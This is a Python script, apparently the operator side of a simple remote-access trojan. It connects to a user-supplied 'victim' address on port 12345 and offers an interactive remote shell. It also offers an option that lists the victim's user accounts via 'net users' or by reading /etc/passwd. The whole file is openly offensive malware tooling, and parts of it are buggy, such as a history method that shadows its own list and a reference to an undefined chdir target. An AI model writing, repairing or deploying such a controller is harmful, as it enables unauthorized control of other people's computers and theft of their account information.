import socket
import os


class Shell:

    history = [""]
    command = ""
    next_command = True

    def send(self):
        # self.history.append(self.command)
        s.send(self.command.encode("utf-8"))

    def receive(self):
        content = s.recv(4096).decode("utf-8")
        if content[2:] == "cd":
            malware_os.chdir(self.command[3:].decode("utf-8"))
        print(content)

    def history(self):
        print("The history of your commands is:\n")
        for element in self.history:
            print(self.history(element))

    # def chgdir(self):
    #     os.chdir(self.command[3:].decode("utf-8"))

    def close(self):
        self.next_command = False


class GetInfo:

    def __init__(self, malware_os):
        self._os = malware_os

    def get_users(self):
        if self._os == "Windows":
            return "net users"
        elif self._os == "b'Linux'":
            return "cut -d: -f1 /etc/passwd"


malware_addr = input("Enter the address of the victim: ")
serv_addr = (malware_addr, 12345)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(serv_addr)
print(s.recv(4096))
s.send("os".encode("utf-8"))
malware_os = s.recv(4096)

getinfo = GetInfo(malware_os)
shell = Shell()

message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
while message != "exit":
    if message == "1":
        while shell.next_command:
                shell.command = input("Shell: ")
                while shell.command == "":
                    shell.command = input("Shell: ")
                if shell.command == "exit":
                    shell.close()
                # elif shell.command[:2] == "cd":
                #     shell.chgdir()
                else:
                    shell.send()
                    shell.receive()
    elif message == "2":
        shell.command = getinfo.get_users()
        shell.send()
        shell.receive()


    message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")


s.close()

